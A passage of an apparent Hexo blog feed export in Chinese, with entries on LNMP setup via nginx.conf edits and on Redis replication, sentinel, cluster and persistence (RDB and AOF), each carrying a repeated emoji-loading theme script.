/usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;67 afastcgi_index index.php;&apos; /usr/local/nginx/conf/nginx.conf </span><br><span class="line">sed -i &apos;69d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;68 afastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;&apos; /usr/local/nginx/conf/nginx.conf</span><br><span class="line">sed -i &apos;70d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;69 ainclude fastcgi_params;&apos; /usr/local/nginx/conf/nginx.conf </span><br><span class="line">sed -i &apos;71d&apos; /usr/local/nginx/conf/nginx.conf &amp;&amp; sed -i &apos;70 a}&apos; /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;nginx&#xFF0C;&#x91CD;&#x542F;php-fpm</span></span><br><span class="line">/usr/local/nginx/sbin/nginx -s reload</span><br><span class="line">systemctl restart php-fpm</span><br><span class="line"></span><br><span class="line">echo &quot;&#x606D;&#x559C;&#xFF01;LNMP&#x52A8;&#x6001;&#x7F51;&#x7AD9;&#x73AF;&#x5883;&#x67B6;&#x6784;&#x7684;&#x914D;&#x7F6E;&#x5DF2;&#x5B8C;&#x6210;&#xFF01;&quot;</span><br><span class="line">echo &quot;MySQL&#x5DF2;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x5B8C;&#x6210;MySQL&#x6570;&#x636E;&#x5E93;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF01;&quot;</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;spa
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Shell编程</title>
    <link href="https://marnm.github.io//posts/6309c3f8/"/>
    <id>https://marnm.github.io//posts/6309c3f8/</id>
    <published>2022-06-07T04:50:59.000Z</published>
    <updated>2022-06-07T04:56:53.682Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis与其他应用的集成</title>
    <link href="https://marnm.github.io//posts/5188e636/"/>
    <id>https://marnm.github.io//posts/5188e636/</id>
    <published>2022-06-07T04:50:43.000Z</published>
    <updated>2022-06-07T04:56:53.661Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis配合MySQL使用</title>
    <link href="https://marnm.github.io//posts/3e3d973e/"/>
    <id>https://marnm.github.io//posts/3e3d973e/</id>
    <published>2022-06-07T04:50:32.000Z</published>
    <updated>2022-06-07T04:56:53.673Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis安装部署——Cluster集群</title>
    <link href="https://marnm.github.io//posts/e8376589/"/>
    <id>https://marnm.github.io//posts/e8376589/</id>
    <published>2022-06-07T04:50:08.000Z</published>
    <updated>2022-06-07T04:56:53.662Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis安装部署——Sentinel模式</title>
    <link href="https://marnm.github.io//posts/e78aaf59/"/>
    <id>https://marnm.github.io//posts/e78aaf59/</id>
    <published>2022-06-07T04:49:59.000Z</published>
    <updated>2022-06-07T04:56:53.664Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis安装部署——主从复制</title>
    <link href="https://marnm.github.io//posts/2acd829b/"/>
    <id>https://marnm.github.io//posts/2acd829b/</id>
    <published>2022-06-07T04:49:49.000Z</published>
    <updated>2022-06-07T05:07:26.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#xFF08;&#x5B9E;&#x73B0;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF09;"><a href="#Redis&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#xFF08;&#x5B9E;&#x73B0;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF09;" class="headerlink" title="Redis&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#xFF08;&#x5B9E;&#x73B0;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF09;"></a>Redis&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#xFF08;&#x5B9E;&#x73B0;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF09;</h1><h2 id="Redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;"><a href="#Redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;" class="headerlink" title="Redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;"></a>Redis&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;</h2><p>&#x4E3B;&#x5E93;&#x4F1A;&#x57FA;&#x4E8E;<code>pingcheck</code>&#x65B9;&#x5F0F;&#x68C0;&#x67E5;&#x4ECE;&#x5E93;&#x662F;&#x5426;&#x5728;&#x7EBF;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x7EBF;&#x5219;&#x76F4;&#x63A5;&#x540C;&#x6B65;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x81F3;&#x4ECE;&#x670D;&#x52A1;&#x7AEF;&#xFF0C;&#x4ECE;&#x670D;&#x52A1;&#x7AEF;&#x4E5F;&#x53EF;&#x4EE5;&#x4E3B;&#x52A8;&#x53D1;&#x9001;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#x5230;&#x4E3B;&#x670D;&#x52A1;&#x5355;&#xFF0C;&#x4E3B;&#x5E93;&#x5982;&#x679C;&#x662F;&#x542F;&#x52A8;&#x4E86;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#x65F6;&#xFF0C;&#x4F1A;&#x4E0D;&#x65AD;&#x7684;&#x540C;&#x6B65;&#x6570;&#x636E;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#xFF0C;&#x4E3B;&#x5E93;&#x4E00;&#x65E6;&#x6536;&#x5230;&#x4ECE;&#x5E93;&#x7684;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x4E3B;&#x5E93;&#x4F1A;&#x5C06;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x505A;&#x5FEB;&#x7167;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x540C;&#x6B65;&#x7ED9;&#x4ECE;&#x5E93;&#xFF0C;&#x4ECE;&#x5E93;&#x5F97;&#x5230;&#x4EE5;&#x540E;&#x662F;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x4E2D;&#xFF08;&#x78C1;&#x76D8;&#xFF09;&#xFF0C;&#x800C;&#x540E;&#x628A;&#x8BE5;&#x6587;&#x52A0;&#x88C5;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x91CD;&#x5EFA;&#xFF0C;&#x94FE;&#x5F0F;&#x590D;&#x5236;&#x4E5F;&#x540C;&#x6B65;&#x5982;&#x6B64;&#xFF0C;&#x56E0;&#x4E3A;&#x4E3B;&#x662F;&#x4E0D;&#x533A;&#x5206;&#x662F;&#x771F;&#x6B63;&#x7684;&#x4E3B;&#xFF0C;&#x8FD8;&#x662F;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7684;&#x4ECE;&#x3002;</p><p><strong>1. &#x542F;&#x52A8;slave</strong></p><p><strong>2. slave&#x4F1A;&#x5411;master&#x53D1;&#x9001;&#x540C;&#x6B65;&#x547D;&#x4EE4;&#xFF0C;&#x8BF7;&#x6C42;&#x4E3B;&#x5E93;&#x4E0A;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x8BBA;&#x4ECE;&#x670D;&#x52A1;&#x7AEF;&#x662F;&#x5426;&#x662F;&#x7B2C;&#x4E00;&#x6B21;&#x8FDE;&#x63A5;&#xFF0C;master&#x6B64;&#x65F6;&#x90FD;&#x4F1A;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x7684;&#x5B50;&#x8FDB;&#x7A0B;&#x5C06;&#x6570;&#x636E;&#x5FEB;&#x7167;&#x4FDD;&#x5B58;&#x5728;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x53D1;&#x9001;&#x7ED9;slave</strong></p><p><strong>3. salve&#x6536;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x4EE5;&#x540E;&#xFF0C;&#x4F1A;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x800C;&#x540E;&#x628A;&#x6587;&#x4EF6;&#x91CD;&#x8F7D;&#x88C5;&#x5165;&#x5185;&#x5B58;</strong></p><h2 id="&#x7279;&#x70B9;"><a href="#&#x7279;&#x70B9;" class="headerlink" title="&#x7279;&#x70B9;"></a>&#x7279;&#x70B9;</h2><p>1&#x3001; &#x4E00;&#x4E2A;Master&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;slave&#xFF1B;<br>2&#x3001; &#x652F;&#x6301;&#x94FE;&#x5F0F;&#x590D;&#x5236;&#xFF08;&#x4E00;&#x4E2A;slave&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x5176;&#x4ED6;&#x7684;slave&#x7684;slave&#xFF09;&#xFF1B;<br>3&#x3001; Master&#x4EE5;&#x975E;&#x963B;&#x585E;&#x65B9;&#x5F0F;&#x540C;&#x6B65;&#x6570;&#x636E;&#x81F3;slave&#xFF08;master&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x5904;&#x7406;&#x591A;&#x4E2A;slave&#x7684;&#x8BFB;&#x5199;&#x8BF7;&#x6C42;&#xFF0C;slave&#x7AEF;&#x5728;&#x540C;&#x6B65;&#x6570;&#x636E;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x975E;&#x963B;&#x585E;&#x65B9;&#x5F0F;&#xFF09;</p><h2 id="&#x542F;&#x7528;&#x590D;&#x5236;&#x529F;&#x80FD;"><a href="#&#x542F;&#x7528;&#x590D;&#x5236;&#x529F;&#x80FD;" class="headerlink" title="&#x542F;&#x7528;&#x590D;&#x5236;&#x529F;&#x80FD;"></a>&#x542F;&#x7528;&#x590D;&#x5236;&#x529F;&#x80FD;</h2><p><strong>Slave</strong></p><pre><code>vim redis.conf</code></pre><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof Redis&#x4E3B;&#x670D;&#x52A1;&#x5668;IP&#x5730;&#x5740; &#x7AEF;&#x53E3;</span><br></pre></td></tr></tbody></table></figure><p>&#x91CD;&#x542F;redis</p><h2 id="sentinel&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x9AD8;&#x53EF;&#x7528;"><a href="#sentinel&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x9AD8;&#x53EF;&#x7528;" class="headerlink" title="sentinel&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x9AD8;&#x53EF;&#x7528;"></a>sentinel&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x9AD8;&#x53EF;&#x7528;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x4E3B;&amp;#x4ECE;&amp;#x67B6;&amp;#x6784;&amp;#xFF08;&amp;#x5B9E;&amp;#x73B0;&amp;#x8BFB;&amp;#x5199;&amp;#x5206;&amp;#x79BB;&amp;#xFF09;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x4E3B;&amp;#x4EC
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis持久化</title>
    <link href="https://marnm.github.io//posts/119ed1dc/"/>
    <id>https://marnm.github.io//posts/119ed1dc/</id>
    <published>2022-06-07T04:49:38.000Z</published>
    <updated>2022-06-07T05:07:06.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x6301;&#x4E45;&#x5316;"><a href="#Redis&#x6301;&#x4E45;&#x5316;" class="headerlink" title="Redis&#x6301;&#x4E45;&#x5316;"></a>Redis&#x6301;&#x4E45;&#x5316;</h1><p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;Redis&#x5DE5;&#x4F5C;&#x65F6;&#x6240;&#x6709;&#x6570;&#x636E;&#x90FD;&#x96C6;&#x90FD;&#x662F;&#x5B58;&#x50A8;&#x4E0E;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#xFF0C;&#x4E0D;&#x8BBA;&#x662F;&#x5426;&#x6709;&#x78C1;&#x76D8;&#x4E0A;&#x7684;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#xFF0C;&#x90FD;&#x662F;&#x5DE5;&#x4F5C;&#x4E8E;&#x5185;&#x5B58;&#x5F53;&#x4E2D;&#xFF0C;redis&#x672C;&#x8EAB;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5185;&#x5B58;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x628A;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x7684;&#x5B58;&#x50A8;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x5982;&#x679C;redis&#x5D29;&#x6E83;&#x6216;&#x65AD;&#x7535;&#x5BFC;&#x81F4;&#x6240;&#x6709;&#x6570;&#x636E;&#x4E22;&#x5931;&#xFF0C;&#x6240;&#x4EE5;redis&#x63D0;&#x4F9B;&#x4E86;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#x6765;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x53EF;&#x9760;&#x6027;&#xFF0C;redis&#x6301;&#x4E45;&#x5316;&#x6709;&#x4E24;&#x79CD;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x3002;RDB&#x548C;AOF</p><h2 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h2><p>RDB&#x5B58;&#x50A8;&#x4E3A;&#x4E8C;&#x8FDB;&#x5236;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x542F;&#x52A8;&#x7684;&#x6301;&#x4E45;&#x5316;&#x673A;&#x5236;&#xFF0C;&#x6309;&#x4E8B;&#x5148;&#x6307;&#x5B9A;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x5468;&#x671F;&#x6027;&#x5730;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x81F3;&#x78C1;&#x76D8;&#xFF0C;&#x4F7F;&#x7528;save&#x547D;&#x4EE4;&#x5373;&#x53EF;&#x8BBE;&#x5B9A;&#x5468;&#x671F;&#x548C;&#x7B56;&#x7565;&#x5373;&#x53EF;&#xFF1B;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x9ED8;&#x8BA4;&#x4E3A;dump.rdb&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x7528;save&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x4FDD;&#x5B58;&#x81F3;&#x6570;&#x636E;&#x81F3;&#x78C1;&#x76D8;&#x3002;</p><p><strong>&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;</strong></p><p>1&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x4E5F;&#x53EF;&#x663E;&#x5F0F;&#x4F7F;&#x7528;<code>SAVE</code>&#x548C;<code>BGSAVE</code>&#x547D;&#x4EE4;&#x542F;&#x52A8;&#x5FEB;&#x7167;&#x4FDD;&#x5B58;&#x673A;&#x5236;&#xFF1B;<br>2&#x3001;&#x501F;&#x52A9;&#x4E8E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6240;&#x5B9A;&#x4E49;&#x7684;save&#x548C;&#x7B56;&#x7565;&#x8FDB;&#x884C;&#x4FDD;&#x5B58;&#xFF1B;</p><p><strong>SAVE&#xFF1A;</strong> &#x662F;&#x540C;&#x6B65;&#x4FDD;&#x5B58;&#xFF0C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x4F7F;&#x7528;save&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#x65F6;&#xFF0C;&#x662F;&#x5728;redis&#x4E3B;&#x7EBF;&#x7A0B;&#x4E2D;&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#xFF1B;&#x56E0;&#x4E3A;redis&#x7684;&#x4E3B;&#x7EBF;&#x7A0B;&#x662F;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x65F6;&#x4F1A;&#x963B;&#x585E;&#x6240;&#x6709;&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#xFF0C;&#x6BCF;&#x6B21;&#x7684;&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#x90FD;&#x662F;&#x628A;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5B8C;&#x6574;&#x7684;&#x4FDD;&#x5B58;&#x4E00;&#x4EFD;&#xFF0C;&#x5E76;&#x975E;&#x662F;&#x589E;&#x91CF;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x800C;&#x8FD8;&#x6709;&#x5927;&#x91CF;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x6B64;&#x65B9;&#x5F0F;&#x4F1A;&#x5F15;&#x8D77;&#x5927;&#x91CF;&#x7684;I/O&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;redis&#x6027;&#x80FD;&#x4E0B;&#x964D;</p><p><strong>BGSAVE&#xFF1A;</strong> &#x5F02;&#x6B65;&#x65B9;&#x5F0F;&#xFF0C;&#x5C06;&#x7ACB;&#x5373;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x81EA;&#x52A8;&#x5728;&#x540E;&#x53F0;&#x4FDD;&#x6301;&#x64CD;&#x4F5C;&#xFF0C;&#x6240;&#x4EE5;BGSAVE&#x547D;&#x4EE4;&#x542F;&#x52A8;&#x4EE5;&#x540E;&#xFF0C;&#x524D;&#x53F0;&#x4E0D;&#x4F1A;&#x88AB;&#x5360;&#x7528;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x662F;&#x4E0D;&#x4F1A;&#x88AB;&#x963B;&#x585E;&#xFF08;&#x4E3B;&#x8FDB;&#x7A0B;&#x4E0D;&#x4F1A;&#x88AB;&#x963B;&#x585E;&#xFF09;</p><p>&#x5982;&#x679C;&#x662F;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;save&#xFF0C;&#x90A3;&#x4E48;redis&#x5728;&#x6301;&#x4E45;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5219;&#x4F1A;&#x5F00;&#x542F;&#x53E6;&#x5916;&#x7684;&#x8FDB;&#x7A0B;&#x53BB;&#x5904;&#x7406;&#xFF0C;&#x4E0D;&#x4F1A;&#x963B;&#x585E;redis&#x7684;&#x4E3B;&#x8FDB;&#x7A0B;</p><p>RDB&#x6301;&#x4E45;&#x5316;&#x4E0D;&#x8DB3;&#x4E4B;&#x5904;&#x5219;&#x662F;&#xFF0C;&#x4E00;&#x65E6;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#xFF0C;&#x7531;&#x4E8E;RDB&#x7684;&#x6570;&#x636E;&#x4E0D;&#x662F;&#x6700;&#x65B0;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x57FA;&#x4E8E;RDB&#x6062;&#x590D;&#x8FC7;&#x6765;&#x7684;&#x6570;&#x636E;&#x4E00;&#x5B9A;&#x4F1A;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x6570;&#x636E;&#x4E22;&#x5931;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;RDB&#x4FDD;&#x5B58;&#x4E4B;&#x540E;&#x7684;&#x4FEE;&#x6539;&#x6570;&#x636E;&#x4F1A;&#x4E22;&#x5931;&#x3002;</p><h2 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h2><p><strong>AOF&#xFF1A;</strong> Append Only File&#xFF0C;&#x6709;&#x7740;&#x66F4;&#x597D;&#x7684;&#x6301;&#x4E45;&#x5316;&#x80FD;&#x529B;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;AOF&#x7C7B;&#x4F3C;&#x4E8E;MySQL&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;&#x8BB0;&#x5F55;&#x6BCF;&#x4E00;&#x6B21;Redis&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#xFF0C;&#x4EE5;&#x987A;&#x5E8F;IO&#x65B9;&#x5F0F;&#x9644;&#x52A0;&#x5728;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x7684;&#x5C3E;&#x90E8;&#xFF0C;&#x662F;&#x4F7F;&#x7528;&#x8FFD;&#x52A0;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x8FD9;&#x4E5F;&#x53EB;&#x505A;&#x4E00;&#x79CD;<strong>&#x9644;&#x52A0;&#x65E5;&#x5FD7;</strong>&#x7C7B;&#x578B;&#x7684;&#x6301;&#x4E45;&#x5316;&#x673A;&#x5236;&#xFF0C;&#x7531;&#x4E8E;&#x6BCF;&#x4E00;&#x6B21;&#x7684;&#x64CD;&#x7EB5;&#x90FD;&#x8BB0;&#x5F55;&#xFF0C;&#x5219;&#x4F1A;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x589E;&#x957F;&#x800C;&#x589E;&#x5927;&#x6587;&#x4EF6;&#x7684;&#x5BB9;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x6709;&#x4E9B;&#x8BB0;&#x5F55;&#x7684;&#x547D;&#x4EE4;&#x662F;&#x591A;&#x4F59;&#x7684;&#xFF0C;AOF&#x4E0D;&#x50CF;RDB&#xFF0C;RDB&#x662F;&#x4FDD;&#x5B58;&#x6570;&#x636E;&#x96C6;&#x7684;&#x672C;&#x8EAB;</p><p>&#x4F46;&#x662F;Redis&#x8FDB;&#x7A0B;&#x80FD;&#x591F;&#x81EA;&#x52A8;&#x7684;&#x53BB;&#x626B;&#x63CF;&#x8FD9;&#x4E2A;&#x5BF9;&#x5E94;&#x7684;AOF&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x5176;&#x4E2D;&#x4E00;&#x4E9B;&#x5197;&#x4F59;&#x7684;&#x64CD;&#x4F5C;&#x7ED9;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#xFF0C;&#x4EE5;&#x5B9E;&#x73B0;&#x5C06;&#x6765;&#x4E00;&#x6B21;&#x6027;&#x628A;&#x6570;&#x636E;&#x6062;&#x590D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;Redis&#x80FD;&#x591F;&#x5408;&#x5E76;&#x91CD;&#x5199;AOF&#x7684;&#x6301;&#x4E45;&#x5316;&#x6587;&#x4EF6;&#xFF0C;&#x7531;BGREWRITEAOF&#x547D;&#x4EE4;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;BGREWIRTEAOF&#x547D;&#x4EE4;&#x662F;&#x5DE5;&#x4F5C;&#x4E8E;&#x540E;&#x53F0;&#x7684;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x91CD;&#x5199;&#x540E;Redis&#x5C06;&#x4F1A;&#x4EE5;&#x5FEB;&#x7167;&#x7684;&#x65B9;&#x5F0F;&#x5C06;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4EE5;&#x547D;&#x4EE4;&#x65B9;&#x5F0F;&#x4FDD;&#x5B58;&#x5728;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6700;&#x540E;&#x66FF;&#x6362;&#x539F;&#x6765;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x65B9;&#x5F0F;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x8BFB;&#x53D6;&#x65E7;AOF&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x662F;&#x76F4;&#x63A5;&#x5C06;&#x5F53;&#x524D;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x76F4;&#x63A5;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#x4E8E;MySQL&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x547D;&#x4